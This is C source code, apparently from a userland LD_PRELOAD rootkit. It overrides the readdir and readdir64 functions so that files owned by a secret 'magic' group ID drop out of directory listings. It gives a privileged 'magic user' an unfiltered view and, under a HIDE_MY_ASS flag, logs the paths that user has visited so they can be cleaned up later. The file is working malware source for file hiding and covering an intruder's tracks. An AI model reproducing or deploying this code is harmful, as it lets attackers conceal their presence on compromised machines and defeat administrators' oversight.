struct dirent *readdir(DIR *dirp){
    char *filename;
    struct dirent *dir;
    size_t pathlen;
    int df = dirfd(dirp);
    gid_t magicgid = readgid();
    struct stat sbuf;

    hook(CREADDIR, C__XSTAT);

    while((dir = call(CREADDIR, dirp)) != NULL){
        if(magicusr()){
#ifdef HIDE_MY_ASS
            char *apath = gdirname(df);
            if(apath != NULL){
                if(!pathtracked(apath))
                    trackwrite(apath);
                free(apath);
            }
#endif
            return dir;
        }

        if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
            continue;

        filename = gdirname(df);
        pathlen = strlen(filename)+strlen(dir->d_name)+2;
        if(pathlen>PATH_MAX){
            free(filename);
            continue;
        }

        char path[pathlen];
        snprintf(path, sizeof(path), "%s/%s", filename, dir->d_name);
        free(filename);

        memset(&sbuf, 0, sizeof(struct stat));
        if((long)call(C__XSTAT, _STAT_VER, path, &sbuf) < 0)
            continue;

        if(sbuf.st_gid == magicgid)
            continue;
        else break;
    }

    return dir;
}

struct dirent64 *readdir64(DIR *dirp){
    char *filename;
    struct dirent64 *dir;
    size_t pathlen;
    int df = dirfd(dirp);
    gid_t magicgid = readgid();
    struct stat sbuf;

    hook(CREADDIR64, C__XSTAT);

    while((dir = call(CREADDIR64, dirp)) != NULL){
        if(magicusr()){
#ifdef HIDE_MY_ASS
            char *apath = gdirname(df);
            if(apath != NULL){
                if(!pathtracked(apath))
                    trackwrite(apath);
                free(apath);
            }
#endif
            return dir;
        }

        if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
            continue;

        filename = gdirname(df);
        pathlen = strlen(filename) +
                  strlen(dir->d_name) + 2;

        if(pathlen > PATH_MAX){
            free(filename);
            continue;
        }

        char path[pathlen];
        snprintf(path, sizeof(path), "%s/%s", filename, dir->d_name);
        free(filename);

        memset(&sbuf, 0, sizeof(struct stat));
        if((long)call(C__XSTAT, _STAT_VER, path, &sbuf) < 0)
            continue;

        if(sbuf.st_gid == magicgid)
            continue;
        else break;
    }

    return dir;
}